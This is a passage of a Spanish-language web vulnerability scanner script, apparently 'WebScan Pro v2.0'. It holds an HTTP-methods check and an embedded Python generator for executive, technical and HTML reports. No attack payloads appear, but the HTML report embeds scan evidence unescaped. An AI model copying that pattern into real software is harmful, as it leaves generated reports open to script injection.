  allowed_methods=$(curl -sk --max-time $TIMEOUT -A "$UA" -X OPTIONS -w "%{http_code}" \
                    -D - "${TARGET_URL}" 2>/dev/null | grep -i "Allow:" | head -1)
  if echo "$allowed_methods" | grep -qi "TRACE\|DELETE\|PUT\|CONNECT"; then
    add_finding "FP06" "Métodos HTTP peligrosos habilitados" "MEDIO" "Configuración" \
      "El servidor permite métodos HTTP peligrosos que no son necesarios para un sitio web normal (TRACE puede facilitar XST, PUT/DELETE pueden modificar ficheros)." \
      "Métodos permitidos: $allowed_methods" \
      "Deshabilitar TRACE, DELETE, PUT y CONNECT. En Apache: TraceEnable off. Limitar métodos a GET, POST, HEAD."
  fi
}

# ════════════════════════════════════════════════════════════════════
# GENERADOR DE INFORMES (Python embebido — script autónomo)
# ════════════════════════════════════════════════════════════════════
generate_reports() {
  section "GENERANDO INFORMES"
  mkdir -p "$OUTPUT_DIR"

  # ── Serializar hallazgos a JSON ───────────────────────────────
  echo "[" > "$FINDINGS_JSON"
  local first=1
  for f in "${FINDINGS_ARRAY[@]}"; do
    [[ $first -eq 1 ]] && first=0 || echo "," >> "$FINDINGS_JSON"
    echo "$f" >> "$FINDINGS_JSON"
  done
  echo "]" >> "$FINDINGS_JSON"

  info "Generando informes TXT y HTML..."

  # ── Generador Python completamente embebido ───────────────────
  python3 - \
    "$TARGET_URL" "$TARGET_HOST" "$SCAN_DATE" \
    "$FINDINGS_JSON" "$OUTPUT_DIR" \
    "$CRITICOS" "$ALTOS" "$MEDIOS" "$BAJOS" "$INFOS" "$TOTAL_VULNS" \
  << 'PYEOF'
import sys, json, os, textwrap

# ── Argumentos ─────────────────────────────────────────────────
target    = sys.argv[1]
host      = sys.argv[2]
scan_date = sys.argv[3]
findings_path = sys.argv[4]
out_dir   = sys.argv[5]
criticos  = int(sys.argv[6])
altos     = int(sys.argv[7])
medios    = int(sys.argv[8])
bajos     = int(sys.argv[9])
infos     = int(sys.argv[10])
total     = int(sys.argv[11])

os.makedirs(out_dir, exist_ok=True)

# ── Cargar hallazgos ───────────────────────────────────────────
SEV_ORDER = {"CRITICO":0,"ALTO":1,"MEDIO":2,"BAJO":3,"INFO":4}
SEV_ES    = {"CRITICO":"CRITICO","ALTO":"ALTO","MEDIO":"MEDIO","BAJO":"BAJO","INFO":"INFORMATIVO"}
SEV_ICON  = {"CRITICO":"[!!!]","ALTO":"[!! ]","MEDIO":"[!  ]","BAJO":"[.  ]","INFO":"[i  ]"}

try:
    with open(findings_path) as fh:
        findings = json.load(fh)
    findings.sort(key=lambda x: SEV_ORDER.get(x.get("severity","INFO"), 4))
except Exception as e:
    # No silenciar esto: si el JSON de /tmp está corrupto (se serializa a
    # mano con sed, no con una librería JSON real — ver manual técnico,
    # limitación conocida), lo correcto es AVISAR, no reportar "0
    # hallazgos" como si el objetivo estuviera limpio. Eso sería
    # engañoso en una herramienta de seguridad.
    print(f"[AVISO] No se pudo leer el JSON de hallazgos en {findings_path}: {e}", file=sys.stderr)
    print("[AVISO] Los informes se generarán SIN hallazgos — esto NO significa que el objetivo esté limpio.", file=sys.stderr)
    findings = []

# ── Copia persistente del JSON en la carpeta de salida ──────────
# El motor solo guardaba el JSON en /tmp (volátil: se pierde al
# reiniciar, o se sobrescribe con el siguiente escaneo). Se escribe
# también aquí, junto a los demás informes, con serialización JSON
# real de Python — más robusta que el hand-rolled de /tmp.
try:
    json_out_path = os.path.join(out_dir, "informe_hallazgos.json")
    with open(json_out_path, "w", encoding="utf-8") as fh:
        json.dump(findings, fh, indent=2, ensure_ascii=False)
except Exception as e:
    print(f"[AVISO] No se pudo escribir informe_hallazgos.json: {e}", file=sys.stderr)

# ── Puntuación de riesgo ───────────────────────────────────────
score = criticos*10 + altos*5 + medios*3 + bajos*1
if score >= 20:   risk = "CRITICO"
elif score >= 10: risk = "ALTO"
elif score >= 5:  risk = "MEDIO"
else:             risk = "BAJO"

risk_descriptions = {
    "CRITICO": "El sistema presenta vulnerabilidades de maxima severidad que requieren accion inmediata. La exposicion actual supone un riesgo grave de compromiso total.",
    "ALTO":    "Se detectaron vulnerabilidades graves que deben corregirse con maxima urgencia antes de cualquier exposicion publica del servicio.",
    "MEDIO":   "Existen vulnerabilidades moderadas que deben planificarse para su correccion en el proximo ciclo de desarrollo.",
    "BAJO":    "Las vulnerabilidades detectadas son de bajo impacto pero deben corregirse para mantener una postura de seguridad adecuada.",
}
risk_desc = risk_descriptions.get(risk, "El sistema ha superado las pruebas sin hallazgos significativos.")

def wrap(text, indent=0, width=74):
    prefix = " " * indent
    return textwrap.fill(text, width=width,
                         initial_indent=prefix, subsequent_indent=prefix)

# ══════════════════════════════════════════════════════════════════
# INFORME EJECUTIVO TXT
# ══════════════════════════════════════════════════════════════════
def make_executive_txt():
    W = 76
    lines = []

    def ln(t=""):         lines.append(t)
    def rule(ch="="):     lines.append(ch * W)
    def box_title(t):
        rule("=")
        pad = (W - len(t) - 2) // 2
        rest = W - pad - len(t) - 2
        lines.append("=" + " "*pad + t + " "*rest + "=")
        rule("=")
    def section_hdr(t):
        ln()
        lines.append("+" + "-"*(W-2) + "+")
        lines.append("|  " + t + " "*(W-4-len(t)) + "|")
        lines.append("+" + "-"*(W-2) + "+")
        ln()

    box_title("INFORME EJECUTIVO DE SEGURIDAD WEB")
    ln()
    ln(f"  Objetivo analizado : {target}")
    ln(f"  Dominio / Host     : {host}")
    ln(f"  Fecha del analisis : {scan_date}")
    ln(f"  Herramienta        : WebScan Pro v2.0")
    ln(f"  Clasificacion      : CONFIDENCIAL")
    ln(f"  Nivel de riesgo    : {risk}  (Puntuacion: {score})")
    ln()
    rule("-")

    # 1. Resumen ejecutivo
    section_hdr("1. RESUMEN EJECUTIVO")
    ln(wrap(
        f"Se ha realizado un analisis automatizado de seguridad web sobre el objetivo "
        f"{target}. El analisis ha evaluado las principales categorias de "
        f"vulnerabilidades web definidas por OWASP Top 10, incluyendo inyeccion SQL, "
        f"XSS, XXE, inclusion de ficheros (LFI/RFI), Path Traversal, SSRF, SSTI, "
        f"cabeceras de seguridad HTTP y deteccion de CMS.", indent=2))
    ln()
    ln(wrap(
        f"Como resultado se han identificado {total} hallazgo(s) de seguridad. "
        f"El nivel de riesgo global del sistema es {risk} con una puntuacion de "
        f"{score} puntos. {risk_desc}", indent=2))
    ln()

    # 2. KPIs
    section_hdr("2. INDICADORES CLAVE (KPIs de Seguridad)")
    ln(f"  {'Severidad':<18} {'Cantidad':>9}   Accion requerida")
    ln(f"  {'-'*18} {'-'*9}   {'-'*28}")
    for label, cnt, action in [
        ("CRITICO",     criticos, "INMEDIATA — parar y corregir"),
        ("ALTO",        altos,    "URGENTE — corregir esta semana"),
        ("MEDIO",       medios,   "PLANIFICADA — proximo sprint"),
        ("BAJO",        bajos,    "RECOMENDADA — backlog"),
        ("INFORMATIVO", infos,    "MONITORIZAR"),
    ]:
        ln(f"  {label:<18} {cnt:>9}   {action}")
    ln(f"  {'-'*18} {'-'*9}")
    ln(f"  {'TOTAL':<18} {total:>9}")
    ln()

    # 3. Hallazgos criticos y altos
    section_hdr("3. HALLAZGOS CRITICOS Y ALTOS")
    critical_high = [f for f in findings if f.get("severity") in ("CRITICO","ALTO")]
    if critical_high:
        for i, f in enumerate(critical_high, 1):
            sev = SEV_ES.get(f.get("severity",""), "")
            ln(f"  [{i}] [{sev}] {f.get('name','')}")
            ln(wrap(f.get('description',''), indent=6))
            ln()
    else:
        ln("  No se detectaron hallazgos criticos o altos.")
        ln()

    # 4. Recomendaciones prioritarias
    section_hdr("4. RECOMENDACIONES PRIORITARIAS")
    ln(wrap("Acciones ordenadas por prioridad para mejorar la postura de seguridad:", indent=2))
    ln()
    prio = [f for f in findings if f.get("severity") in ("CRITICO","ALTO","MEDIO")][:8]
    if prio:
        for i, f in enumerate(prio, 1):
            ln(f"  {i}. {f.get('name','')}")
            for rline in textwrap.wrap(f.get('recommendation',''), width=70):
                ln(f"     {rline}")
            ln()
    else:
        ln("  No se requieren acciones de remediacion urgentes.")
        ln()

    # 5. Conclusion
    section_hdr("5. CONCLUSION Y PROXIMOS PASOS")
    ln(wrap(
        "Se recomienda abordar con caracter urgente todas las vulnerabilidades "
        "clasificadas como CRITICAS y ALTAS antes de cualquier despliegue en "
        "produccion. Las MEDIAS deben planificarse para el proximo sprint.", indent=2))
    ln()
    ln(wrap(
        "Se sugiere establecer un proceso de pruebas de seguridad continuo "
        "(DevSecOps) en el pipeline CI/CD y complementar este analisis con un "
        "pentest manual realizado por un equipo especializado.", indent=2))
    ln()
    rule("=")
    ln(f"  Generado por WebScan Pro v2.0  |  {scan_date}")
    rule("=")

    path = os.path.join(out_dir, "informe_ejecutivo.txt")
    with open(path, "w", encoding="utf-8") as fout:
        fout.write("\n".join(lines) + "\n")
    print(f"  [OK] Informe ejecutivo  : {path}")
    return path

# ══════════════════════════════════════════════════════════════════
# INFORME TECNICO IT TXT
# ══════════════════════════════════════════════════════════════════
def make_technical_txt():
    W = 78
    lines = []

    def ln(t=""):     lines.append(t)
    def rule(ch="="): lines.append(ch * W)
    def box_title(t):
        rule("=")
        pad = (W - len(t) - 2) // 2
        rest = W - pad - len(t) - 2
        lines.append("=" + " "*pad + t + " "*rest + "=")
        rule("=")
    def section_hdr(t):
        ln(); ln()
        lines.append("#" + "=" * (W-2) + "#")
        lines.append("#  " + t.upper() + " " * (W - 4 - len(t)) + "#")
        lines.append("#" + "=" * (W-2) + "#")
        ln()

    def finding_block(f, idx):
        sev  = f.get("severity", "INFO")
        name = f.get("name", "")
        icon = SEV_ICON.get(sev, "[?]")
        ln("  " + "~" * (W-4))
        ln(f"  {icon} #{idx:02d}  {name}")
        ln("  " + "~" * (W-4))
        ln(f"  Severidad   : {SEV_ES.get(sev,'')}   |   Categoria: {f.get('category','')}")
        ln(f"  ID          : {f.get('id','')}")
        ln()
        ln("  DESCRIPCION:")
        for dl in textwrap.wrap(f.get("description",""), width=W-4):
            ln(f"    {dl}")
        ln()
        ln("  EVIDENCIA TECNICA:")
        for el in textwrap.wrap(f.get("evidence",""), width=W-4):
            ln(f"    {el}")
        ln()
        ln("  RECOMENDACION:")
        for rl in textwrap.wrap(f.get("recommendation",""), width=W-4):
            ln(f"    {rl}")
        ln()

    box_title("INFORME TECNICO DE SEGURIDAD  --  DEPARTAMENTO IT")
    ln()
    ln(f"  OBJETIVO          : {target}")
    ln(f"  HOST              : {host}")
    ln(f"  FECHA ANALISIS    : {scan_date}")
    ln(f"  HERRAMIENTA       : WebScan Pro v2.0")
    ln(f"  RIESGO GLOBAL     : {risk}  (Score: {score}/100)")
    ln(f"  CLASIFICACION     : CONFIDENCIAL -- USO INTERNO IT")
    ln()
    rule("-")

    # Metodologia
    section_hdr("1. METODOLOGIA Y ALCANCE")
    ln(wrap("Analisis semi-activo basado en OWASP Testing Guide v4. Modulos ejecutados:", indent=2))
    ln()
    for item in [
        "Security Headers HTTP (HSTS, CSP, X-Frame-Options, Referrer-Policy...)",
        "SQL Injection -- Error-based y Time-based blind",
        "Cross-Site Scripting (XSS) -- Reflected GET/POST y JSON",
        "XML External Entity Injection (XXE)",
        "Local File Inclusion (LFI) -- con PHP wrappers",
        "Remote File Inclusion (RFI)",
        "Path / Directory Traversal",
        "Server-Side Request Forgery (SSRF)",
        "Server-Side Template Injection (SSTI) -- Jinja2, Twig, FreeMarker, ERB, Velocity",
        "Deteccion de CMS y configuraciones por defecto",
        "Archivos y rutas sensibles expuestas",
        "Fingerprinting: cookies, metodos HTTP, HTTPS, directory listing",
    ]:
        ln(f"    - {item}")
    ln()
    ln(wrap("NOTA: Este analisis automatizado NO sustituye un pentest manual completo.", indent=2))

    # Estadisticas
    section_hdr("2. RESUMEN ESTADISTICO")
    total_safe = max(total, 1)
    ln(f"  {'SEVERIDAD':<16} {'N':>4}   {'%':>5}   {'SCORE':>6}   ACCION")
    ln(f"  {'-'*16} {'-'*4}   {'-'*5}   {'-'*6}   {'-'*22}")
    for sev_lbl, cnt, pts, action in [
        ("CRITICO",     criticos, criticos*10, "INMEDIATA"),
        ("ALTO",        altos,    altos*5,     "URGENTE"),
        ("MEDIO",       medios,   medios*3,    "PLANIFICADA"),
        ("BAJO",        bajos,    bajos*1,     "OPCIONAL"),
        ("INFORMATIVO", infos,    0,           "MONITORIZAR"),
    ]:
        pct = cnt * 100 // total_safe
        ln(f"  {sev_lbl:<16} {cnt:>4}   {pct:>4}%   {pts:>6}   {action}")
    ln(f"  {'-'*16} {'-'*4}   {'-'*5}   {'-'*6}")
    ln(f"  {'TOTAL':<16} {total:>4}          {score:>6}   Riesgo: {risk}")
    ln()

    # Hallazgos detallados
    section_hdr("3. HALLAZGOS DETALLADOS")
    if findings:
        for i, f in enumerate(findings, 1):
            finding_block(f, i)
    else:
        ln("  No se encontraron vulnerabilidades.")
        ln()

    # Plan de remediacion
    section_hdr("4. PLAN DE REMEDIACION PRIORIZADO")
    p1 = [f for f in findings if f.get("severity") in ("CRITICO","ALTO")]
    p2 = [f for f in findings if f.get("severity") == "MEDIO"]
    p3 = [f for f in findings if f.get("severity") in ("BAJO","INFO")]

    if p1:
        ln("  -- PRIORIDAD 1: ACCION INMEDIATA / URGENTE --")
        ln()
        for i, f in enumerate(p1, 1):
            ln(f"  [{i}] {f.get('name','')}")
            for rl in textwrap.wrap(f.get('recommendation',''), width=W-6):
                ln(f"       {rl}")
            ln()
    if p2:
        ln("  -- PRIORIDAD 2: PLANIFICAR EN PROXIMO SPRINT --")
        ln()
        for i, f in enumerate(p2, 1):
            ln(f"  [{i}] {f.get('name','')}")
            for rl in textwrap.wrap(f.get('recommendation',''), width=W-6):
                ln(f"       {rl}")
            ln()
    if p3:
        ln("  -- PRIORIDAD 3: MEJORAS RECOMENDADAS --")
        ln()
        for i, f in enumerate(p3, 1):
            ln(f"  [{i}] {f.get('name','')}")
            ln()

    if not (p1 or p2 or p3):
        ln("  No se requieren acciones de remediacion.")
        ln()

    # Checklist
    section_hdr("5. CHECKLIST POST-REMEDIACION")
    checklist = [
        ("Cabeceras HTTP de seguridad configuradas (HSTS, CSP, X-Frame...)", "SEC.HEADERS"),
        ("Consultas SQL parametrizadas en toda la aplicacion",               "SQLi"),
        ("Output encoding en todas las vistas",                              "XSS"),
        ("Parser XML con DTD y entidades externas desactivadas",             "XXE"),
        ("Rutas de archivo validadas con whitelist",                         "LFI/PT"),
        ("allow_url_include desactivado en PHP",                             "RFI"),
        ("URLs externas validadas con whitelist",                            "SSRF"),
        ("Input del usuario nunca en render() de plantillas",                "SSTI"),
        ("Sandboxing del motor de plantillas activado",                      "SSTI"),
        ("CMS y plugins actualizados a ultima version",                      "CMS"),
        ("Archivos sensibles eliminados del document root",                  "FILES"),
        ("Cookies con Secure, HttpOnly y SameSite",                         "COOKIES"),
        ("Redireccion HTTP->HTTPS forzada (301)",                            "TLS"),
        ("Directory listing desactivado",                                    "CONFIG"),
        ("Metodos HTTP peligrosos desactivados (TRACE, PUT...)",             "CONFIG"),
        ("WAF configurado y activo",                                         "WAF"),
        ("Nuevo analisis de seguridad realizado tras remediacion",           "PROCESO"),
    ]
    for item, ref in checklist:
        ln(f"  [ ] {item:<60} ({ref})")
    ln()

    rule("=")
    ln(f"  WebScan Pro v2.0  |  {scan_date}  |  CONFIDENCIAL")
    rule("=")

    path = os.path.join(out_dir, "informe_tecnico_IT.txt")
    with open(path, "w", encoding="utf-8") as fout:
        fout.write("\n".join(lines) + "\n")
    print(f"  [OK] Informe tecnico IT : {path}")
    return path

# ══════════════════════════════════════════════════════════════════
# INFORME HTML
# ══════════════════════════════════════════════════════════════════
def make_html():
    SEV_COL = {
        "CRITICO": ("#FF4444","#1a0000","#ff8080"),
        "ALTO":    ("#FF8C00","#1a0800","#ffb347"),
        "MEDIO":   ("#FFD700","#1a1500","#ffe57a"),
        "BAJO":    ("#28C76F","#001a0a","#5de0a0"),
        "INFO":    ("#4EA8DE","#001525","#7bc8f6"),
    }
    SEV_ICON_HTML = {"CRITICO":"&#x1F534;","ALTO":"&#x1F7E0;","MEDIO":"&#x1F7E1;","BAJO":"&#x1F7E2;","INFO":"&#x1F535;"}
    RISK_COL = {"CRITICO":"#FF4444","ALTO":"#FF8C00","MEDIO":"#FFD700","BAJO":"#28C76F"}

    bar_max = max(criticos, altos, medios, bajos, infos, 1)

    # Hallazgos HTML
    cards_html = ""
    for i, f in enumerate(findings, 1):
        sev = f.get("severity","INFO")
        col, bg, light = SEV_COL.get(sev,("#888","#111","#aaa"))
        sev_label = SEV_ES.get(sev,"")
        icon = SEV_ICON_HTML.get(sev,"&#x26AA;")
        cards_html += f"""
        <div class="card" data-sev="{sev}">
          <div class="card-hdr" style="border-left:5px solid {col};background:{bg}">
            <div class="card-top">
              <span class="badge" style="background:{col}">
                {icon} {sev_label}
              </span>
              <span class="card-num">#{i:02d}</span>
              <span class="card-name">{f.get('name','')}</span>
            </div>
            <div class="card-meta">
              <span class="tag">&#x1F3F7; {f.get('category','')}</span>
              <span class="tag">ID: {f.get('id','')}</span>
            </div>
          </div>
          <div class="card-body">
            <div class="field">
              <div class="field-label">&#x1F4CB; Descripcion</div>
              <p>{f.get('description','')}</p>
            </div>
            <div class="field">
              <div class="field-label">&#x1F50D; Evidencia tecnica</div>
              <code>{f.get('evidence','')}</code>
            </div>
            <div class="field rec">
              <div class="field-label">&#x2705; Recomendacion</div>
              <p>{f.get('recommendation','')}</p>
            </div>
          </div>
        </div>"""

    if not cards_html:
        cards_html = '<p class="empty">&#x2705; No se detectaron vulnerabilidades.</p>'

    # Tabla resumen
    table_rows = ""
    for i, f in enumerate(findings, 1):
        sev = f.get("severity","INFO")
        col = SEV_COL.get(sev,("#888","#111","#aaa"))[0]
        icon = SEV_ICON_HTML.get(sev,"&#x26AA;")
        table_rows += (
            f"<tr><td>{i}</td>"
            f"<td style='color:{col};font-weight:700'>{icon} {SEV_ES.get(sev,'')}</td>"
            f"<td style='font-family:monospace;font-size:12px'>{f.get('id','')}</td>"
            f"<td>{f.get('name','')}</td>"
            f"<td>{f.get('category','')}</td></tr>"
        )
    if not table_rows:
        table_rows = "<tr><td colspan='5' class='empty'>&#x2705; Sin hallazgos</td></tr>"

    # Barras de estadisticas
    bars = ""
    for label, cnt, col in [
        ("Critico", criticos, "#FF4444"),
        ("Alto",    altos,    "#FF8C00"),
        ("Medio",   medios,   "#FFD700"),
        ("Bajo",    bajos,    "#28C76F"),
        ("Info",    infos,    "#4EA8DE"),
    ]:
        pct = cnt * 100 // bar_max
        bars += (
            f'<div class="bar-row">'
            f'<span class="bar-lbl">{label}</span>'
            f'<div class="bar-track">'
            f'<div class="bar-fill" style="width:{pct}%;background:{col}">{cnt}</div>'
            f'</div></div>'
        )

    # Checklist HTML
    ck_items = [
        ("Cabeceras HTTP de seguridad (HSTS, CSP, X-Frame-Options...)", "SEC.HEADERS"),
        ("Consultas SQL parametrizadas en toda la aplicacion", "SQLi"),
        ("Output encoding en todas las vistas", "XSS"),
        ("Parser XML con DTD y entidades externas OFF", "XXE"),
        ("Rutas de archivo validadas con whitelist", "LFI/PT"),
        ("allow_url_include desactivado en PHP", "RFI"),
        ("URLs externas validadas con whitelist (SSRF)", "SSRF"),
        ("Input de usuario nunca en render() de plantillas", "SSTI"),
        ("Sandboxing del motor de plantillas configurado", "SSTI"),
        ("CMS y plugins actualizados", "CMS"),
        ("Archivos sensibles eliminados del document root", "FILES"),
        ("Cookies con Secure, HttpOnly y SameSite", "COOKIES"),
        ("Redireccion HTTP a HTTPS forzada", "TLS"),
        ("Directory listing desactivado", "CONFIG"),
        ("Metodos HTTP peligrosos desactivados", "CONFIG"),
        ("WAF configurado y activo", "WAF"),
        ("Analisis repetido tras remediacion", "PROCESO"),
    ]
    ck_html = "".join(
        f'<li><label><input type="checkbox"> {item} <small>({ref})</small></label></li>'
        for item, ref in ck_items
    )

    risk_col = RISK_COL.get(risk, "#888")

    rem_parts = []
    for f in findings:
        if f.get("severity") not in ("CRITICO","ALTO","MEDIO"):
            continue
        sev  = f.get("severity","INFO")
        col  = SEV_COL.get(sev,("#888","#111","#aaa"))[0]
        icon = SEV_ICON_HTML.get(sev,"&#x26AA;")
        lbl  = SEV_ES.get(sev,"")
        name = f.get("name","")
        rec  = f.get("recommendation","")
        rem_parts.append(
            '<div class="card">'
            '<div class="card-hdr" style="border-left:4px solid ' + col
            + ';background:var(--bg2);cursor:default">'
            '<div class="card-top">'
            '<span class="badge" style="background:' + col + ';color:#000">'
            + icon + ' ' + lbl + '</span>'
            '<span class="card-name">' + name + '</span>'
            '</div></div>'
            '<div class="card-body" style="display:block">'
            '<div class="field rec"><div class="field-label">Recomendacion</div>'
            '<p>' + rec + '</p></div></div></div>'
        )
    rem_html = "\n".join(rem_parts) if rem_parts else \
        '<p class="empty">&#x2705; No se requieren acciones urgentes.</p>'

    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WebScan Pro — Informe de Seguridad</title>
<style>
:root{{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;
      --text:#c9d1d9;--muted:#8b949e;--accent:#58a6ff}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);
     color:var(--text);line-height:1.6}}
/* Header */
.hdr{{background:linear-gradient(135deg,#0d1117,#1a1f35,#0d1117);
      border-bottom:1px solid var(--border);padding:36px 50px}}
.hdr-logo{{font-size:12px;color:var(--muted);letter-spacing:3px;
           text-transform:uppercase;margin-bottom:10px}}
.hdr h1{{font-size:32px;font-weight:700;color:#fff}}
.hdr h1 span{{color:var(--accent)}}
.hdr-meta{{display:flex;gap:28px;flex-wrap:wrap;margin-top:16px}}
.hdr-meta-item .lbl{{font-size:11px;color:var(--muted);text-transform:uppercase;
                      letter-spacing:1px}}
.hdr-meta-item .val{{font-size:14px;font-weight:500}}
.risk-chip{{display:inline-flex;flex-direction:column;
            border:2px solid {risk_col};background:{risk_col}18;
            padding:10px 20px;border-radius:8px;margin-top:16px}}
.risk-chip .rl{{font-size:11px;color:var(--muted);text-transform:uppercase}}
.risk-chip .rv{{font-size:24px;font-weight:700;color:{risk_col}}}
.risk-chip .rs{{font-size:12px;color:var(--muted)}}
/* Nav */
.nav{{background:var(--bg2);border-bottom:1px solid var(--border);
     padding:0 50px;position:sticky;top:0;z-index:100}}
.nav ul{{list-style:none;display:flex}}
.nav a{{display:block;padding:13px 18px;color:var(--muted);text-decoration:none;
        font-size:13px;border-bottom:2px solid transparent;transition:.2s}}
.nav a:hover,.nav a.active{{color:var(--accent);border-bottom-color:var(--accent)}}
/* Layout */
.main{{max-width:1100px;margin:0 auto;padding:36px 50px}}
.sec-title{{font-size:19px;font-weight:700;color:#fff;
            border-bottom:2px solid var(--accent);
            padding-bottom:10px;margin:36px 0 18px}}
/* Stats */
.stats{{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;margin-bottom:20px}}
.stat{{background:var(--bg2);border:1px solid var(--border);
       border-radius:10px;padding:18px;text-align:center;
       border-top:3px solid transparent}}
.stat.c{{border-top-color:#FF4444}}.stat.a{{border-top-color:#FF8C00}}
.stat.m{{border-top-color:#FFD700}}.stat.b{{border-top-color:#28C76F}}
.stat.i{{border-top-color:#4EA8DE}}
.stat-n{{font-size:38px;font-weight:700;line-height:1}}
.stat-l{{font-size:11px;color:var(--muted);text-transform:uppercase;
         letter-spacing:1px;margin-top:4px}}
.stat.c .stat-n{{color:#FF4444}}.stat.a .stat-n{{color:#FF8C00}}
.stat.m .stat-n{{color:#FFD700}}.stat.b .stat-n{{color:#28C76F}}
.stat.i .stat-n{{color:#4EA8DE}}
/* Bars */
.bar-row{{display:flex;align-items:center;gap:10px;margin-bottom:8px}}
.bar-lbl{{width:70px;font-size:13px;color:var(--muted);text-align:right}}
.bar-track{{flex:1;background:var(--bg3);border-radius:4px;height:22px;overflow:hidden}}
.bar-fill{{height:100%;border-radius:4px;min-width:28px;
           display:flex;align-items:center;padding-left:8px;
           font-size:12px;font-weight:700;color:#000;transition:width .8s ease}}
/* Filters */
.filters{{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px}}
.fbtn{{padding:6px 16px;border-radius:20px;border:1px solid var(--border);
       background:var(--bg2);color:var(--muted);cursor:pointer;
       font-size:13px;transition:.2s}}
.fbtn:hover,.fbtn.on{{background:var(--accent);color:#000;
                       border-color:var(--accent);font-weight:700}}
/* Cards */
.card{{background:var(--bg2);border:1px solid var(--border);
       border-radius:10px;margin-bottom:16px;overflow:hidden;transition:.15s}}
.card:hover{{border-color:#58a6ff44}}
.card-hdr{{padding:14px 18px;cursor:pointer}}
.card-top{{display:flex;align-items:center;gap:10px;flex-wrap:wrap}}
.badge{{padding:3px 11px;border-radius:20px;font-size:11px;
        font-weight:700;text-transform:uppercase;color:#000}}
.card-num{{font-size:12px;color:var(--muted);font-family:monospace}}
.card-name{{font-size:15px;font-weight:600;color:#fff}}
.card-meta{{display:flex;gap:8px;flex-wrap:wrap;margin-top:6px}}
.tag{{font-size:12px;color:var(--muted);background:#ffffff0d;
      padding:2px 9px;border-radius:10px}}
.card-body{{padding:0 18px 18px;display:none}}
.field{{margin-top:14px}}
.field-label{{font-size:12px;color:var(--muted);text-transform:uppercase;
              letter-spacing:1px;margin-bottom:6px}}
.field p{{font-size:14px;text-align:justify}}
.field code{{display:block;background:var(--bg3);border:1px solid var(--border);
             padding:10px 14px;border-radius:6px;font-family:monospace;
             font-size:13px;word-break:break-all}}
.rec p{{color:#5de0a0}}
.empty{{padding:30px;text-align:center;color:#5de0a0;font-size:15px}}
/* Table */
.tbl-wrap{{overflow-x:auto}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
th{{background:var(--bg3);color:var(--muted);text-transform:uppercase;
    font-size:11px;letter-spacing:1px;padding:11px 14px;text-align:left;
    border-bottom:2px solid var(--border)}}
td{{padding:11px 14px;border-bottom:1px solid var(--border);vertical-align:top}}
tr:hover td{{background:#ffffff05}}
/* Summary boxes */
.info-grid{{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:16px}}
.ibox{{background:var(--bg2);border:1px solid var(--border);
       border-radius:10px;padding:18px}}
.ibox h4{{font-size:12px;color:var(--muted);text-transform:uppercase;
          letter-spacing:1px;margin-bottom:10px}}
.ibox p{{font-size:14px;text-align:justify}}
/* Checklist */
.checklist{{list-style:none;columns:2;gap:28px}}
.checklist li{{padding:5px 0;font-size:13px;break-inside:avoid}}
.checklist label{{display:flex;gap:8px;cursor:pointer;align-items:flex-start}}
.checklist input[type=checkbox]{{margin-top:2px;accent-color:var(--accent);
                                 flex-shrink:0}}
.checklist small{{color:var(--muted)}}
/* Footer */
.footer{{background:var(--bg2);border-top:1px solid var(--border);
         padding:20px 50px;text-align:center}}
.footer p{{font-size:12px;color:var(--muted)}}
@media(max-width:700px){{
  .hdr,.nav,.main,.footer{{padding-left:16px;padding-right:16px}}
  .stats{{grid-template-columns:repeat(3,1fr)}}
  .info-grid,.checklist{{grid-template-columns:1fr;columns:1}}
}}
</style>
</head>
<body>

<header class="hdr">
  <div class="hdr-logo">&#x26A1; WebScan Pro v2.0 &mdash; Informe de Seguridad Web</div>
  <h1>Analisis de <span>Vulnerabilidades</span></h1>
  <div class="hdr-meta">
    <div class="hdr-meta-item"><span class="lbl">Objetivo</span><span class="val">{target}</span></div>
    <div class="hdr-meta-item"><span class="lbl">Host</span><span class="val">{host}</span></div>
    <div class="hdr-meta-item"><span class="lbl">Fecha</span><span class="val">{scan_date}</span></div>
    <div class="hdr-meta-item"><span class="lbl">Hallazgos</span><span class="val">{total}</span></div>
  </div>
  <div class="risk-chip">
    <span class="rl">Nivel de riesgo global</span>
    <span class="rv">{risk}</span>
    <span class="rs">Puntuacion: {score} / 100</span>
  </div>
</header>

<nav class="nav">
  <ul>
    <li><a href="#resumen" class="active">Resumen</a></li>
    <li><a href="#hallazgos">Hallazgos ({total})</a></li>
    <li><a href="#tabla">Tabla</a></li>
    <li><a href="#remediacion">Remediacion</a></li>
    <li><a href="#checklist">Checklist</a></li>
  </ul>
</nav>

<main class="main">

  <section id="resumen">
    <h2 class="sec-title">&#x1F4CA; Resumen Ejecutivo</h2>
    <div class="stats">
      <div class="stat c"><div class="stat-n">{criticos}</div><div class="stat-l">&#x1F534; Critico</div></div>
      <div class="stat a"><div class="stat-n">{altos}</div><div class="stat-l">&#x1F7E0; Alto</div></div>
      <div class="stat m"><div class="stat-n">{medios}</div><div class="stat-l">&#x1F7E1; Medio</div></div>
      <div class="stat b"><div class="stat-n">{bajos}</div><div class="stat-l">&#x1F7E2; Bajo</div></div>
      <div class="stat i"><div class="stat-n">{infos}</div><div class="stat-l">&#x1F535; Info</div></div>
    </div>
    <div class="bar-chart">{bars}</div>
    <div class="info-grid">
      <div class="ibox"><h4>&#x1F3AF; Alcance</h4>
        <p>Se evaluaron: SQLi, XSS, XXE, LFI, RFI, Path Traversal, SSRF, SSTI,
        cabeceras de seguridad HTTP, deteccion de CMS y archivos sensibles expuestos.</p>
      </div>
      <div class="ibox"><h4>&#x1F4CC; Conclusion</h4>
        <p>{risk_desc} Se recomienda abordar con urgencia todos los hallazgos
        CRITICOS y ALTOS antes del proximo despliegue a produccion.</p>
      </div>
    </div>
  </section>

  <section id="hallazgos">
    <h2 class="sec-title">&#x1F50D; Hallazgos Detallados</h2>
    <div class="filters">
      <button class="fbtn on" onclick="filter('ALL',this)">Todos ({total})</button>
      <button class="fbtn" onclick="filter('CRITICO',this)">&#x1F534; Critico ({criticos})</button>
      <button class="fbtn" onclick="filter('ALTO',this)">&#x1F7E0; Alto ({altos})</button>
